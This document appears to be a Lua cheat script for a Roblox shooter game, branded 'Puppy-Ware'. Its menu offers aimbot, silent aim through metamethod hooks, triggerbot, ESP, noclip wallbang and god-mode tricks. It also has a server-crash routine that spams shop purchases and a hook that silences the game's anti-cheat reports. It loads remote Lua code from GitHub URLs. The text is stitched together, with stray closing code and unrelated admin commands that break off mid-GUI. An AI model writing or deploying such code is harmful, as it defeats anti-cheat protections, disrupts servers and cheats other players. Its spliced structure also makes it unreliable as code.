local NotifyLibrary = Module.Functions.HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua")
local Notify = NotifyLibrary.Notify
Module.Functions.Init()

Library.theme.topheight = 50
--Library.theme.accentcolor = Color3.fromRGB(255, 105, 180)
--Library.theme.accentcolor2 = Color3.fromRGB(128, 23, 90)
Library.theme.fontsize = 15
Library.theme.titlesize = 17

if PuppywareSettings.Watermark == true then

Library:CreateWatermark("Puppy-Ware | {fps} | {game}")

end

local Window = Library:CreateWindow(Script.Name, Vector2.new(492, 598), Enum.KeyCode.RightShift)
local LegitTab = Window:CreateTab("Legit")
local AimbotSection = LegitTab:CreateSector("Aimbot", "left")

local AimbotToggle = AimbotSection:AddToggle('Enabled', false, function(State)
Settings.Aimbot.Enabled = State
end)

AimbotSection:AddToggle('Visible Check', false, function(State)
Settings.Aimbot.VisibleCheck = State
end)

AimbotSection:AddDropdown('Hitbox', {"Head", "HumanoidRootPart"}, "Head", false, function(Option)
Settings.Aimbot.Hitbox = Option
end)

AimbotSection:AddDropdown('Nearest', {"Mouse", "Distance"}, "Mouse", false, function(Option)
Settings.Aimbot.Nearest = Option
end)

local AimbotFOVSection = LegitTab:CreateSector("FOV", "left")

AimbotFOVSection:AddToggle('Enabled', false, function(State)
Settings.Aimbot.FOV.Enabled = State
end)

AimbotFOVSection:AddToggle('Filled', false, function(State)
Settings.Aimbot.FOV.Filled = State
end)

AimbotFOVSection:AddDropdown('Shape', {"Custom", "Octagon", "Circle"}, "Custom", false, function(Option)
Settings.Aimbot.FOV.Shape = Option
end)

AimbotFOVSection:AddSlider("Size", 25, 100, 500, 1, function(Value)
Settings.Aimbot.FOV.Size = Value
end)

AimbotFOVSection:AddSlider("Round", 2.5, 100, 500, 1, function(Value)
Settings.Aimbot.FOV.Round = Value
end)

AimbotFOVSection:AddSlider("Transparency", 0, 5, 10, 1, function(Value)
Settings.Aimbot.FOV.Transparency = tonumber("0." .. Value)
end)

AimbotFOVSection:AddColorpicker("Color", Settings.Aimbot.FOV.Color, function(Color)
Settings.Aimbot.FOV.Color = Color
end)

local TriggerbotSection = LegitTab:CreateSector("Triggerbot", "right")

TriggerbotSection:AddToggle('Enabled', Settings.Triggerbot.Enabled, function(State)
Settings.Triggerbot.Enabled = State
end)
local RageTab = Window:CreateTab("Rage")
local SilentAimSection = RageTab:CreateSector("Silent Aim", "left")

local SilentToggle = SilentAimSection:AddToggle('Silent Aim', false, function(State)
Settings.SilentAim.Enabled = State
end)

SilentAimSection:AddToggle('Wallbang (Beta)', false, function(State)
Settings.SilentAim.WallBang = State
end)


SilentAimSection:AddToggle('Ping Based Prediction',false,function(State)
Settings.Prediction_Settings.AutoSettings = State
end)

SilentAimSection:AddToggle('Visible Check', false, function(State)
Settings.SilentAim.VisibleCheck = State
end)

SilentAimSection:AddToggle('Ignore FOV', false, function(State)
Settings.SilentAim.IgnoreFOV = State
end)

SilentAimSection:AddToggle('Look At', false, function(State)
Settings.SilentAim.LookAt = State
end)

SilentAimSection:AddDropdown('Modes', {"Normal", "Insane"}, "Insane", false, function(Option)
Settings.SilentAim.Mode = Option
end)

SilentAimSection:AddDropdown('Hitbox', {"Head", "HumanoidRootPart"}, "Head", false, function(Option)
Settings.SilentAim.Hitbox = Option
end)

SilentAimSection:AddDropdown('Nearest', {"Mouse", "Distance"}, "Mouse", false, function(Option)
Settings.SilentAim.Nearest = Option
end)

local FOVSection = RageTab:CreateSector("FOV", "left")

FOVSection:AddToggle('Enabled', false, function(State)
Settings.SilentAim.FOV.Enabled = State
end)

FOVSection:AddToggle('Filled', false, function(State)
Settings.SilentAim.FOV.Filled = State
end)

FOVSection:AddDropdown('Shape', {"Custom", "Octagon", "Circle"}, "Custom", false, function(Option)
Settings.SilentAim.FOV.Shape = Option
end)

FOVSection:AddSlider("Size", 25, 100, 500, 1, function(Value)
Settings.SilentAim.FOV.Size = Value
end)

FOVSection:AddSlider("Round", 2.5, 100, 500, 1, function(Value)
Settings.SilentAim.FOV.Round = Value
end)

FOVSection:AddSlider("Transparency", 0, 5, 10, 1, function(Value)
Settings.SilentAim.FOV.Transparency = tonumber("0." .. Value)
end)

FOVSection:AddColorpicker("Color", Settings.SilentAim.FOV.Color, function(Color)
Settings.SilentAim.FOV.Color = Color
end)

local AntiAimSeciton = RageTab:CreateSector("Anti Aim", "right")

AntiAimSeciton:AddToggle('Enabled', false, function(State)
Settings.AntiAim.Enabled = State
end)

AntiAimSeciton:AddDropdown('Type', {"Spin", "Jitter"}, "Jitter", false, function(Option)
Settings.AntiAim.Type = Option
end)

AntiAimSeciton:AddSlider("Speed", 10, 50, 300, 1, function(Value)
Settings.AntiAim.Speed = Value
end)

AntiAimSeciton:AddSlider("Angle", 0, 180, 360, 1, function(Value)
Settings.AntiAim.Angle = Value
end)

AntiAimSeciton:AddToggle('Anti Point At', false, function(State)
Settings.AntiAim.AntiPointAt = State
end)

AntiAimSeciton:AddSlider("Anti Point At Distance", 2.5, 20, 100, 1, function(Value)
Settings.AntiAim.AntiPointAtDistance = Value
end)

AntiAimSeciton:AddToggle('Underground', false, function(State)
if State then
    Settings.AntiAim.Underground = true
    Module.Functions.Underground(true)
else
    Settings.AntiAim.Underground = false
    Module.Functions.Underground(false)
end
end)

local Undergroundwallbangtoggle = AntiAimSeciton:AddToggle('Underground Wallbang', Settings.AntiAim.UndergroundWallbang, function(State)
    pcall(function()
        if State then
			wait(0.5)
			Float = Instance.new("BodyVelocity")
			Float.Parent = LocalPlayer.Character.HumanoidRootPart
			Float.MaxForce = Vector3.new(100000, 100000, 100000)
			Float.Velocity = Vector3.new(0, 0, 0)
			wait(0.25)
			LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -11.5, 0)
			Module.Functions.Cham(LocalPlayer, true)
			Settings.AntiAim.UndergroundWallbang = true
		else
			LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 11.5, 0)
			Module.Functions.Cham(LocalPlayer, false)
			Float:Destroy()
			Settings.AntiAim.UndergroundWallbang = false
		end
    end)
end)

Undergroundwallbangtoggle:AddKeybind(Enum.KeyCode.X)

AntiAimSeciton:AddToggle('No Auto Rotate', false, function(State)
Settings.AntiAim.NoAutoRotate = State
end)

AntiAimSeciton:AddButton('Invisible', function(State)
Module.Functions.Invisible()
end)

AntiAimSeciton:AddButton('Nil Body', function(State)
Module.Functions.NilBody()
end)

local WhitelistSection = RageTab:CreateSector("Settings", "right")

WhitelistSection:AddTextbox("Player Username", nil, function(Text)
if Text ~= nil and Module.Functions.Find(Text) ~= nil and Players:FindFirstChild(Module.Functions.Find(Text)) then
    Settings.Whitelist.Holder = Module.Functions.Find(Text)
else
    Notify({
        Title = Script.Name,
        Description = "Player is not found.",
        Duration = 3
    })
end
end)

WhitelistSection:AddButton('Add Whitelist', function(State)
if Settings.Whitelist.Holder ~= nil and Players:FindFirstChild(Settings.Whitelist.Holder) then
    if Find(Settings.Whitelist.Players, Settings.Whitelist.Holder) then
        Notify({
            Title = Script.Name,
            Description = Settings.Whitelist.Holder .. " is whitelisted.",
            Duration = 3
        })
    else
        Insert(Settings.Whitelist.Players, Settings.Whitelist.Holder)
        Notify({
            Title = Script.Name,
            Description = "Whitelisted " .. Settings.Whitelist.Holder,
            Duration = 3
        })
    end
else
    Notify({
        Title = Script.Name,
        Description = "Player is not found.",
        Duration = 3
    })
end
end)

WhitelistSection:AddButton('Remove Whitelist', function()
if Settings.Whitelist.Holder ~= nil and Players:FindFirstChild(Settings.Whitelist.Holder) then
    if Find(Settings.Whitelist.Players, Settings.Whitelist.Holder) then
        Module.Functions.TableRemove(Settings.Whitelist.Players, Settings.Whitelist.Holder)
        Notify({
            Title = Script.Name,
            Description = "Removed " .. Settings.Whitelist.Holder,
            Duration = 5
        })
    else
        Notify({
            Title = Script.Name,
            Description = Settings.Whitelist.Holder .. " is not whitelisted.",
            Duration = 5
        })
    end
else
    Notify({
        Title = Script.Name,
        Description = "Player is not found.",
        Duration = 3
    })
end
end)

WhitelistSection:AddToggle('Whitelist Enabled', false, function(State)
Settings.Whitelist.Enabled = State
end)

WhitelistSection:AddToggle('Crew Whitelist', false, function(State)
Settings.Whitelist.CrewEnabled = State
end)

WhitelistSection:AddToggle('Friends Whitelist', false, function(State)
Settings.Whitelist.FriendsWhitelist = State
end)

local MiscTab = Window:CreateTab("Misc")
local ServerSection = MiscTab:CreateSector("Server Crasher", "left")

ServerSection:AddToggle('Enabled', false, function(State)
if State then
    Module.Functions.Invisible()
end
Settings.ServerCrash.Enabled = State
end)

local CrashPercent = ServerSection:AddLabel('Percent : 0%')

local KillSaySection = MiscTab:CreateSector("Kill Say", "right")

KillSaySection:AddDropdown('Method', {"After Dead", "Before Dead"}, "After Dead", false, function(Option)
Settings.KillSay.Type = Option
end)

KillSaySection:AddToggle('Enabled', false, function(State)
Settings.KillSay.Enabled = State
end)

KillSaySection:AddToggle('Custom Message', false, function(State)
Settings.KillSay.CustomMessage = State
end)

KillSaySection:AddTextbox("Custom Message Text", "@s is tapped!", function(Text)
Settings.KillSay.CustomMessageText = Text
end)

local MovementSection = MiscTab:CreateSector("Movement", "right")

MovementSection:AddDropdown('Method', {"Render", "Heartbeat"}, "Render", false, function(Option)
Settings.Movement.Type = Option
end)

MovementSection:AddToggle('CFrame Speed Enabled', false, function(State)
Settings.Movement.CFrameSpeed = State
end)

local GodSection = MiscTab:CreateSector("God", "left")

GodSection:AddButton('God Block', function(State)
pcall(function()
    LocalPlayer.Character.BodyEffects.Defense.CurrentTimeBlock:Destroy()
end)
end)

GodSection:AddButton('God Bullet', function(State)
Settings.God.GodBullet = State
Module.Functions.NilBody()
end)

GodSection:AddButton('God Melee', function(State)
Settings.God.GodMelee = State
Module.Functions.NilBody()
end)

GodSection:AddButton('Anti Ragdoll', function(State)
Settings.God.AntiRagdoll = State
Module.Functions.NilBody()
end)

local TargetTab = Window:CreateTab("Target")
local MainSection = TargetTab:CreateSector("Main", "left")

MainSection:AddToggle('Enabled', false, function(State)
Settings.Target.Enabled = State
end)

MainSection:AddToggle('Wall Check', false, function(State)
Settings.Target.WallCheck = State
end)

if not PuppywareSettings.PerformanceMode then
local ESPLibrary = Module.Functions.HttpGet("https://gist.githubusercontent.com/VaultGitos/5a937cdc7a753160232d86dcc3ce79a6/raw/99cce502c74b1574abfd8d79d36da3c8aa3be83d/ESP.lua")
local VisualsTab = Window:CreateTab("Visuals")
local ESPSection = VisualsTab:CreateSector("ESP", "left")

local BoxToggle = ESPSection:AddToggle('Boxes', false, function(State)
    ESPLibrary.Boxes = State
end)

BoxToggle:AddColorpicker(Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.BoxesColor = Color
end)

local NameToggle = ESPSection:AddToggle('Name', false, function(State)
    ESPLibrary.Names = State
end)

NameToggle:AddColorpicker(Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.NamesColor = Color
end)

local DistanceToggle = ESPSection:AddToggle('Distance', false, function(State)
    ESPLibrary.Distance = State
end)

DistanceToggle:AddColorpicker(Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.DistanceColor = Color
end)

local ChamToggle = ESPSection:AddToggle('Chams', false, function(State)
    ESPLibrary.Cham = State
end)

ESPSection:AddColorpicker("Cham Color 1", Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.ChamColor1 = Color
end)

ESPSection:AddColorpicker("Cham Color 2", Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.ChamColor2 = Color
end)
end

game:GetService("Workspace").Players.ChildRemoved:Connect(function(PlayerThatIsGone)
if PlayerThatIsGone.Name == Settings.KillSay.OldPlayer and Settings.KillSay.Type == "After Dead" then
    if Settings.KillSay.CustomMessage then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.CustomMessageText:gsub("@s", Settings.KillSay.OldPlayer), "All")
    else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.Message[math.random(1, 4)]:gsub("@s", Settings.KillSay.OldPlayer), "All")
    end
end
end)

UserInputService.InputBegan:Connect(function(Key, Break)
if Key.UserInputType == InputType.MouseButton2 and not Break then
    Settings.Aimbot.Aiming = true
end
if Key.UserInputType == InputType.MouseButton1 and not Break then
    if Module.Functions.Network(LocalPlayer) then
        if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
            Settings.KillSay.OldPlayer = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name
            Settings.KillSay.Cooldown = true
            spawn(function()
                wait(1)
                Settings.KillSay.Cooldown = false
            end)
        end
    end
    if Settings.SilentAim.Enabled and Settings.SilentAim.WallBang and Module.Functions.Network(LocalPlayer) then
        if not Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) and LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
            if LocalPlayer.Character.RightHand:FindFirstChild("RightWrist") then
                LocalPlayer.Character.RightHand:FindFirstChild("RightWrist"):Destroy()
            end
            wait(0.1)
            LocalPlayer.Character.Humanoid:ChangeState(11)
            LocalPlayer.Character.RightHand.CFrame = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, 0)
        end
    end
end
if Key.KeyCode == Enum.KeyCode[Settings.Target.Bind] and not Break then
    if Settings.Target.Enabled then
        if Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) then
            Settings.Target.TargetUser = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name
            Notify({
                Title = Script.Name .. " " .. Script.Version,
                Description = "Targetted " .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name .. " (" .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).DisplayName .. ")",
                Duration = 3
            })
        end
    end
end
end)

UserInputService.InputEnded:Connect(function(Key, Break)
if Key.UserInputType == InputType.MouseButton2 and not Break then
    Settings.Aimbot.Aiming = false
end
if Key.UserInputType == InputType.MouseButton1 and not Break then
    if Module.Functions.Network(LocalPlayer) then
        --[[
            local GRightWrist = Instance.new("Motor6D", LocalPlayer.Character.RightHand)
            GRightWrist.C0 = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.C1 = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.CurrentAngle = 0
            GRightWrist.Name = "RightWrist"
            GRightWrist.Part0 = LocalPlayer.Character.RightLowerArm
            GRightWrist.Part1 = LocalPlayer.Character.RightHand
        ]]
        wait(0.75)
        LocalPlayer.Character.RightHand.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 0)
    end
end
end)

local __Index;
__Index = hookmetamethod(game, "__index", function(t, k)
if t == Mouse and (tostring(k) == "Hit" or tostring(k) == "Target") then
    if Settings.Target.Enabled then
        if Settings.Target.TargetUser ~= nil then
            if Players:FindFirstChild(Settings.Target.TargetUser) ~= nil and Module.Functions.Network(Players[Settings.Target.TargetUser]) then
                if (not Settings.Target.WallCheck or Module.Functions.IsVisible(Players[Settings.Target.TargetUser].Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
                    local TargetBody
                    if Players[Settings.Target.TargetUser].Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall then
                        TargetBody = Players[Settings.Target.TargetUser].Character.LeftFoot
                    else
                        TargetBody = Players[Settings.Target.TargetUser].Character[Settings.SilentAim.Hitbox]
                    end
                    local Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)

                    return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
                end
            end
        end
    else
        if Settings.SilentAim.Enabled then
            local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
            if NearestTarget and (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
                local TargetBody
                if NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and Settings.SilentAim.Mode == "Insane" then
                    TargetBody = NearestTarget.Character.LeftFoot
                else
                    TargetBody = NearestTarget.Character[Settings.SilentAim.Hitbox]
                end

                local Prediction 
                if Settings.Prediction_Settings.AutoSettings then
                    Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)
                else
                    Prediction = TargetBody.CFrame + (TargetBody.Velocity * 0.165)
                end

                return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
            end
        end
    end
end

return __Index(t, k)
end)

local __Namecall;
__Namecall = hookmetamethod(game, "__namecall", function(self, ...)
local Args = {...}
local Method = getnamecallmethod()

if tostring(self.Name) == "MainEvent" and tostring(Method) == "FireServer" then
    if Args[1] == "TeleportDetect" or Args[1] == "CHECKER_1" or Args[1] == "OneMoreTime" then
        return
    end
end

return __Namecall(self, ...)
end)

if not Module.DrawingInstance["FOV"] then
Module.DrawingInstance["FOV"] = Module.Drawing.Circle(1)
end

if not Module.DrawingInstance["FOV2"] then
Module.DrawingInstance["FOV2"] = Module.Drawing.Circle(1)
end

RunService.RenderStepped:Connect(function()
if Settings.Prediction_Settings.AutoSettings then
    local PingStats = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    local Value = tostring(PingStats)
    local PingValue = Value:split(" ")
    local PingNumber = tonumber(PingValue[1])

        Settings.Prediction_Settings.Prediction = PingNumber / 1000 + 0.037
end

if Settings.Aimbot.Enabled and Settings.Aimbot.Aiming then
    local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.Aimbot.Nearest)
    if NearestTarget and (not Settings.Aimbot.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.Aimbot.FOV.Enabled or Settings.Aimbot.FOV.Size > NearestPos) then
        local Prediction = NearestTarget.Character[Settings.Aimbot.Hitbox].CFrame + (NearestTarget.Character[Settings.Aimbot.Hitbox].Velocity * Settings.Prediction_Settings.Prediction)
        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Prediction.Position)
    end
end

if Settings.SilentAim.FOV.Enabled then
    Module.DrawingInstance["FOV"].Visible = true
    Module.DrawingInstance["FOV"].Radius = Settings.SilentAim.FOV.Size
    Module.DrawingInstance["FOV"].Transparency = Settings.SilentAim.FOV.Transparency
    Module.DrawingInstance["FOV"].Filled = Settings.SilentAim.FOV.Filled
    if Settings.SilentAim.FOV.Shape == "Custom" then
        Module.DrawingInstance["FOV"].NumSides = Settings.SilentAim.FOV.Round
    elseif Settings.SilentAim.FOV.Shape == "Octagon" then
        Module.DrawingInstance["FOV"].NumSides = 12.5
    else 
        Module.DrawingInstance["FOV"].NumSides = 100
    end
    Module.DrawingInstance["FOV"].Color = Settings.SilentAim.FOV.Color
    Module.DrawingInstance["FOV"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
else
    Module.DrawingInstance["FOV"].Visible = false
end

if Settings.Aimbot.FOV.Enabled then
    Module.DrawingInstance["FOV2"].Visible = true
    Module.DrawingInstance["FOV2"].Radius = Settings.Aimbot.FOV.Size
    Module.DrawingInstance["FOV2"].Transparency = Settings.Aimbot.FOV.Transparency
    Module.DrawingInstance["FOV2"].Filled = Settings.Aimbot.FOV.Filled
    if Settings.Aimbot.FOV.Shape == "Custom" then
        Module.DrawingInstance["FOV2"].NumSides = Settings.Aimbot.FOV.Round
    elseif Settings.Aimbot.FOV.Shape == "Octagon" then
        Module.DrawingInstance["FOV2"].NumSides = 12.5
    else 
        Module.DrawingInstance["FOV"].NumSides = 100
    end
    Module.DrawingInstance["FOV2"].Color = Settings.Aimbot.FOV.Color
    Module.DrawingInstance["FOV2"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
else
    Module.DrawingInstance["FOV2"].Visible = false
end

if Module.Functions.Network(LocalPlayer) then
    local Char = LocalPlayer.Character
    local Root = Char.HumanoidRootPart
    local Hum = Char.Humanoid

    if Settings.ServerCrash.Enabled then
        Hum:ChangeState(11)
    end

    if Settings.Movement.CFrameSpeed then
        if Settings.Movement.Type == "Render" then
            if Hum.MoveDirection.Magnitude > 0 then
                Char:TranslateBy(Hum.MoveDirection)
            end
        end
    end
end
end)

loadstring[[
game:GetService("RunService").Stepped:Connect(function() --// The broken part
    if Settings.AntiAim.UndergroundWallbang then
        for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
    end
end)
]]

RunService.Heartbeat:Connect(function()
if Module.Functions.Network(LocalPlayer) then
    local Char = LocalPlayer.Character
    local Root = Char.HumanoidRootPart
    local Hum = Char.Humanoid

    if Settings.Movement.CFrameSpeed then
        if Settings.Movement.Type == "Heartbeat" then
            if Hum.MoveDirection.Magnitude > 0 then
                Char:TranslateBy(Hum.MoveDirection)
            end
        end
    end

    if Settings.SilentAim.LookAt then
        local PrimaryPartOfChar = Char.PrimaryPart
        local NearestMouse, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
        if Module.Functions.Network(NearestMouse) then
            if (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestMouse.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
                local NearestChar = NearestMouse.Character
                local NearestRoot = NearestChar.HumanoidRootPart
                local NearestPos = CFrame.new(PrimaryPartOfChar.Position, Vector3.new(NearestRoot.Position.X, NearestRoot.Position.Y, NearestRoot.Position.Z))
                Char:SetPrimaryPartCFrame(NearestPos)
            end
        end
    end

    if Settings.AntiAim.NoAutoRotate then
        Hum.AutoRotate = false
    else
        Hum.AutoRotate = true
    end

    if Settings.AntiAim.AntiPointAt then
        for i, v in next, Players:GetPlayers() do
            if v ~= LocalPlayer and Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) then
                local BodyEffects = v.Character:FindFirstChild("BodyEffects")
                local MousePos = BodyEffects:FindFirstChild("MousePos")
                if BodyEffects ~= nil and MousePos ~= nil then
                    local EnemyMouseMagnitude = (LocalPlayer.Character.HumanoidRootPart.Position - MousePos.Value).Magnitude
                    if Settings.AntiAim.AntiPointAtDistance > EnemyMouseMagnitude then
                        Root.CFrame = Root.CFrame * CFrame.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
                    end
                end
            end
        end
    end

    if Settings.AntiAim.UndergroundWallbang then
        Hum:ChangeState(11)
    end

    if Settings.AntiAim.Enabled then
        if Settings.AntiAim.Type == "Jitter" then
            Module.Functions.Jitter(Settings.AntiAim.Speed, Settings.AntiAim.Angle)
        else
            Module.Functions.Spin(Settings.AntiAim.Speed)
        end
    end
end
end)

while wait() do
if Module.Functions.Network(LocalPlayer) then
    local Char = LocalPlayer.Character
    local Root = Char.HumanoidRootPart
    local Hum = Char.Humanoid

    if Settings.Triggerbot.Enabled then
        for i, v in next, Players:GetPlayers() do 
            if Module.Functions.Network(v) then 
                if Mouse.Target:IsDescendantOf(v.Character) then 
                    mouse1press()
                    wait()
                    mouse1release()
                    if Settings.Triggerbot.Delay.Enabled then
                        wait(Settings.Triggerbot.Delay.Value)
                    end
                end 
            end
        end
    end

    if Settings.KillSay.Type == "Before Dead" and Settings.KillSay.OldPlayer ~= nil then
        if Players[Settings.KillSay.OldPlayer].Character.BodyEffects.Dead then
            if Settings.KillSay.CustomMessage then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.CustomMessageText:gsub("@s", Settings.KillSay.OldPlayer), "All")
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.Message[math.random(1, 4)]:gsub("@s", Settings.KillSay.OldPlayer), "All")
            end
        end
    end

    if Settings.ServerCrash.Enabled then
        Root.CFrame = workspace.Ignored.Shop["[Cranberry] - $3"].Head.CFrame * CFrame.new(0, -7, 0)
        fireclickdetector(workspace.Ignored.Shop["[Cranberry] - $3"].ClickDetector)
        fireclickdetector(workspace.Ignored.Shop["[Cranberry] - $3"].ClickDetector)
        for i, v in pairs(LocalPlayer.Backpack:GetChildren()) do
            if v.Name == tostring("[Cranberry]") then
                v.Parent = LocalPlayer.Character
                Settings.ServerCrash.Value = Settings.ServerCrash.Value + 1
                CrashPercent:Set("Percent : " .. tostring(Settings.ServerCrash.Value * 100 / 500) .. "%" .. " / " .. "100%")
                if Settings.ServerCrash.Value == 500 then
                    Module.Functions.NilBody()
                end
            end
        end
    end
end
end

while wait(3) do
if Settings.KillSay.Cooldown then
    Settings.KillSay.OldPlayer = ""
end
end
end)


AddCommand("dash", {"whoosh"}, "dashes", {}, function(Caller)
	local plr = game:GetService('Players').LocalPlayer
	local char = plr.Character
	char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 300
        Notify({ 
Description = "weee";
Title = "WHOOSHH";
Duration = 2;
});
end)

AddCommand("timeusage", {"timer"}, "lol", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
else
local timeusage = Instance.new("ScreenGui")
local timeusagemainframe = Instance.new("Frame")
local timeusagelable = Instance.new("TextLabel")
local timeusagehours = Instance.new("TextLabel")
local timeusageminutes = Instance.new("TextLabel")
local timeusageseconds = Instance.new("TextLabel")
local timeusageclose = Instance.new("TextButton")
local timeusagesecondsnum = Instance.new("TextLabel")
local timeusageminutesnum = Instance.new("TextLabel")
local timeusagehoursnum = Instance.new("TextLabel")

--Properties:

timeusage.Name = "timeusage"
timeusage.Parent = game.CoreGui
timeusage.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

timeusagemainframe.Name = "timeusagemainframe"
timeusagemainframe.Parent = timeusage
timeusagemainframe.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagemainframe.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagemainframe.Position = UDim2.new(0.123390593, 0, 0.160493851, 0)
timeusagemainframe.Size = UDim2.new(0, 278, 0, 139)

timeusagelable.Name = "timeusagelable"
timeusagelable.Parent = timeusagemainframe
timeusagelable.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagelable.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagelable.Size = UDim2.new(0, 224, 0, 30)
timeusagelable.Font = Enum.Font.SourceSans
timeusagelable.Text = "Time useage checker"
timeusagelable.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagelable.TextSize = 20.000
timeusagelable.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusagehours.Name = "timeusagehours"
timeusagehours.Parent = timeusagemainframe
timeusagehours.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagehours.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagehours.Position = UDim2.new(0, 0, 0.266187042, 0)
timeusagehours.Size = UDim2.new(0, 90, 0, 30)
timeusagehours.Font = Enum.Font.SourceSans
timeusagehours.Text = "hours"
timeusagehours.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagehours.TextSize = 20.000
timeusagehours.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageminutes.Name = "timeusageminutes"
timeusageminutes.Parent = timeusagemainframe
timeusageminutes.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutes.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutes.Position = UDim2.new(0.350194544, 0, 0.266187042, 0)
timeusageminutes.Size = UDim2.new(0, 90, 0, 30)
timeusageminutes.Font = Enum.Font.SourceSans
timeusageminutes.Text = "minutes"
timeusageminutes.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusageminutes.TextSize = 20.000
timeusageminutes.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageseconds.Name = "timeusageseconds"
timeusageseconds.Parent = timeusagemainframe
timeusageseconds.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageseconds.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageseconds.Position = UDim2.new(0.677042782, 0, 0.266187042, 0)
timeusageseconds.Size = UDim2.new(0, 90, 0, 30)
timeusageseconds.Font = Enum.Font.SourceSans
timeusageseconds.Text = "seconds"
timeusageseconds.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusageseconds.TextSize = 20.000
timeusageseconds.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageclose.Name = "timeusageclose"
timeusageclose.Parent = timeusagemainframe
timeusageclose.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageclose.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageclose.Position = UDim2.new(0.677042782, 0, 0, 0)
timeusageclose.Size = UDim2.new(0, 89, 0, 37)
